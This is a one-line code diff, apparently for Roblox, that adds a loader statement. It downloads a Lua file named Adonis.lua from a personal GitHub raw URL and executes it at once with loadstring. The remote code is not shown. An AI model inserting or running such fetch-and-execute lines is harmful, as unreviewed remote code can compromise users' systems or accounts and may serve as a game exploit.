@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cool8865/Adonis/main/Adonis.lua"))()
